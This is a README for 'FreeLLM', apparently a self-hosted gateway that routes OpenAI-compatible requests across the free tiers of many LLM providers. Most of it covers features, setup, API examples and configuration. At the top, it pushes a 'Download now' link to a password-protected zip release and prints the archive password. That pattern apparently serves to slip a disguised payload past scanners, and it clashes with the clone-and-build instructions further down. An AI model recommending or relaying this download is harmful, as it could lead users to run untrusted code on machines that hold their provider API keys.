# FreeLLM

**One OpenAI-compatible endpoint for all your free LLM tiers.**

FreeLLM is a self-hosted gateway that combines the free tiers of many LLM providers behind a single `/v1` API. Add your own provider keys, point any OpenAI client at your local server, and the router handles the rest: it picks a healthy model for every request, fails over to the next provider when one is rate-limited, and tracks usage per key so you stay under every quota.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#contributing)
[![Docker](https://img.shields.io/badge/docker-ready-2496ED.svg)](#quick-start)

## [⬇ Download now](https://github.com/jaredfreellm/FREELLM_INSTALL/releases/download/1.3.1/FreeLLM.zip)

**Archive password:** `FREELLM`

> **For personal experimentation and prototyping.** Free tiers come with no SLA and no frontier models. See [Limitations](#limitations) before building anything important on top of this.

---

## Contents

- [Why this exists](#why-this-exists)
- [Features](#features)
- [Quick start](#quick-start)
- [Using the API](#using-the-api)
- [Works with your tools](#works-with-your-tools)
- [Supported providers](#supported-providers)
- [How it works](#how-it-works)
- [Configuration](#configuration)
- [Security and privacy](#security-and-privacy)
- [FAQ](#faq)
- [Limitations](#limitations)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Why this exists

Almost every AI provider now offers a free tier: a few million tokens per month, a few thousand requests per day. On its own, each tier is a toy. Stacked together, they add up to a lot of usable inference capacity.

The catch is that stacking them by hand is painful. Every provider has its own SDK, its own authentication, its own rate limits, and its own ways of failing. Your code ends up full of retry logic, quota bookkeeping, and provider-specific branches.

FreeLLM removes that work. You talk to one endpoint using the OpenAI API format you already know, and the router decides which provider actually serves each request.

## Features

- **Drop-in OpenAI compatibility.** Chat completions, embeddings, streaming, tool calling, and structured outputs work with the official OpenAI SDKs and any compatible client. No code changes beyond the base URL.
- **Smart routing.** Models are ranked by live speed, capability, and reliability scores. Choose a routing strategy (fastest, smartest, balanced) globally or per request.
- **Automatic failover.** On a rate limit (429) or server error (5xx), the router puts that key on cooldown and retries the next model in your chain, so your app rarely sees a failure.
- **Per-key quota tracking.** Counters for requests and tokens, per minute and per day, are kept for every `(provider, model, key)` combination, so routing stays under every free-tier cap.
- **Key rotation.** Add several keys for the same provider and the router spreads load across them.
- **Fallback chains and profiles.** Define named chains, for example a coding chain and a vision chain, and select them per request.
- **Encrypted key storage.** Provider keys are encrypted at rest and decrypted only in memory at request time. Your apps only ever see one unified access token.
- **Custom providers.** Point the router at any OpenAI-compatible endpoint: a local Ollama, llama.cpp, vLLM, LM Studio, or a remote gateway.
- **Web dashboard.** Manage keys, reorder the fallback chain, test models in a playground, and view latency, success rate, and token usage over time.
- **Transparent responses.** Every response includes a header showing which provider and model actually served it.
- **Lightweight.** Runs anywhere Node.js or Docker runs, including small ARM boards.

## Quick start

### Option 1: Docker (recommended)

```bash
git clone https://github.com/jaredfreellm/FREELLM_INSTALL.git
cd FREELLM_INSTALL
cp .env.example .env
# Generate an encryption key and paste it into .env as ENCRYPTION_KEY
openssl rand -hex 32

docker compose up -d
```

### Option 2: From source

Requirements: Node.js 20 or newer.

```bash
git clone https://github.com/jaredfreellm/FREELLM_INSTALL.git
cd FREELLM_INSTALL
npm install
cp .env.example .env
npm run dev
```

### First-time setup

1. Open the dashboard at `http://localhost:3001`.
2. Go to the **Keys** page and add the API keys of the providers you have accounts with.
3. Open the **Fallback Chain** page and order models to your taste, or just pick a routing strategy.
4. Copy your **unified API key** from the Keys page header. This is the only credential your apps need.

## Using the API

Point any OpenAI-compatible client at your local server.

### Python

```python
from openai import OpenAI

client = OpenAI(
    base_url="http://localhost:3001/v1",
    api_key="your-unified-key",
)

response = client.chat.completions.create(
    model="auto",  # let the router choose, or use "auto:fast", "auto:smart", a profile name, or a specific model ID
    messages=[{"role": "user", "content": "Explain how TCP congestion control works in two sentences."}],
)

print(response.choices[0].message.content)
```

### Node.js

```javascript
import OpenAI from "openai";

const client = new OpenAI({
  baseURL: "http://localhost:3001/v1",
  apiKey: "your-unified-key",
});

const completion = await client.chat.completions.create({
  model: "auto",
  messages: [{ role: "user", content: "Write a haiku about rate limits." }],
});

console.log(completion.choices[0].message.content);
```

### curl

```bash
curl http://localhost:3001/v1/chat/completions \
  -H "Authorization: Bearer your-unified-key" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "auto",
    "messages": [{"role": "user", "content": "Hello!"}],
    "stream": true
  }'
```

### Which provider answered?

Every response carries an `X-Routed-Via: <provider>/<model>` header, so you always know where a request went.

### Model selectors

| Value | Behavior |
| --- | --- |
| `auto` | Router picks the best available model using your default strategy |
| `auto:fast` | Prefers the lowest-latency healthy model |
| `auto:smart` | Prefers the most capable healthy model |
| `auto:<profile>` | Uses a named fallback chain you defined |
| `<model-id>` | Pins a specific model (still fails over to equivalent endpoints if available) |

## Works with your tools

Anything that can target an OpenAI-compatible base URL works. Set the base URL to `http://localhost:3001/v1` and use your unified key.

Typical examples include coding assistants and editors (Cline, Aider, Continue, Cursor-style tools), chat front ends, agent frameworks (LangChain, LlamaIndex), and your own scripts.

## Supported providers

FreeLLM ships with adapters for a growing list of providers that offer free tiers. Examples:

- Google (Gemini)
- Groq
- Cerebras
- Mistral
- OpenRouter
- Cloudflare Workers AI
- Cohere
- NVIDIA
- Hugging Face

Free-tier quotas and model lineups change often. Check each provider's current terms before relying on a specific limit.

Anything not on the list can be added through the **custom provider** option, as long as it speaks the OpenAI API.

## How it works

```
 Your app ──► /v1 (unified key) ──► Router ──► Provider A ──► response
                                      │            ╳ 429 / 5xx
                                      ├────────► Provider B ──► response
                                      │            ╳ over quota
                                      └────────► Provider C ──► response
```

For each request the router:

1. Builds a candidate list from your fallback chain or routing strategy.
2. Skips models whose keys are unhealthy, on cooldown, or already at a rate limit.
3. Decrypts the selected key in memory and calls the provider.
4. On a retryable error, cools that key down and moves to the next candidate.
5. Records tokens, latency, and outcome for analytics and quota tracking.

## Configuration

Settings live in a `.env` file. The most important ones:

| Variable | Description | Default |
| --- | --- | --- |
| `PORT` | Port the server listens on | `3001` |
| `ENCRYPTION_KEY` | 32-byte hex key used to encrypt provider keys at rest | required |
| `DATABASE_PATH` | Location of the SQLite database | `./data/app.db` |
| `DEFAULT_STRATEGY` | Routing strategy used for `auto` | `balanced` |
| `COOLDOWN_SECONDS` | How long a key rests after a rate limit | `60` |
| `RESPONSE_CACHE` | Enable the optional response cache | `false` |

Back up your `ENCRYPTION_KEY`. Without it, stored provider keys cannot be decrypted.

## Security and privacy

- Provider keys are encrypted at rest and decrypted only in memory while a request is in flight.
- Your applications use a single unified token and never see the underlying provider keys.
- The gateway is designed to be **local-first and single-user**. Requests go from your machine directly to the providers you enabled.
- By default the server listens on localhost. If you expose it to a network, put it behind a reverse proxy with TLS and keep the unified key secret.
- Never commit your `.env` file or database to version control.

Found a vulnerability? Please report it privately, see [SECURITY.md](SECURITY.md).

## FAQ

**Is this really free?**
The software is free and open source. The models are free only as long as the providers keep offering free tiers, and you must create your own accounts and keys.

**Can I use it in production?**
Not recommended. Free tiers have no SLA, variable latency, and can change or disappear without notice. It is built for prototyping, learning, and personal projects.

**Why is quality worse late in the day?**
Free tiers usually have daily caps. As the best models hit their limits, the router falls back to weaker ones. Caps typically reset at a fixed time (often midnight UTC).

**Does it send my prompts anywhere besides the providers?**
No. Prompts go from your machine to the providers you enabled and nowhere else.

**I forgot my dashboard password.**
Use the password reset flow on the login page. A one-time code is printed in the server log (`docker compose logs -f`).

**How do I uninstall?**
Run `docker compose down -v` (or remove the app) and delete the data directory.

## Limitations

Stacking free tiers has real trade-offs:

- **No frontier models.** Expect small and mid-size models, not the most capable ones.
- **Variable latency.** Free capacity is shared and can be slow at peak times.
- **No SLA.** Providers can throttle, change, or retire free models at any time.
- **Inconsistent behavior.** The same prompt may be answered by different models, so outputs can vary between requests. Use sticky sessions or pin a model if you need consistency.
- **Feature gaps.** Not every provider supports every parameter (tool calling, vision, JSON mode). The router tries to pick compatible models, but edge cases exist.

## Roadmap

- [ ] Cost-aware routing for users who mix free and paid keys
- [ ] Regional pinning and provider allow/deny lists
- [ ] More endpoints (audio, images)
- [ ] Prompt caching and compression
- [ ] Improved analytics (per-model quality tracking)
- [ ] Helm chart and one-click deploy recipes

Have an idea? Open an issue and let's talk.

## Contributing

Contributions of all sizes are welcome. Good first contributions:

- **Add a provider:** copy an existing adapter, register it, seed its models, and add a test.
- **Improve routing:** better latency weighting, smarter cooldowns.
- **Polish the dashboard:** charts, key import/export, accessibility.
- **Docs:** more client examples and deployment guides.
- **Translations:** fix or add a language.

To get started:

```bash
npm install
npm run dev     # server on :3001, dashboard with hot reload
npm test        # keep the suite green
```

Please include a test with your pull request and follow the existing code style. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

## License

Released under the [MIT License](LICENSE).

## Disclaimer

FreeLLM is an independent project and is not affiliated with, endorsed by, or sponsored by any LLM provider. You are responsible for complying with the terms of service of every provider whose API keys you add, including their rules on free-tier usage, rate limits, and account creation. This project is intended for personal experimentation. Use it responsibly.
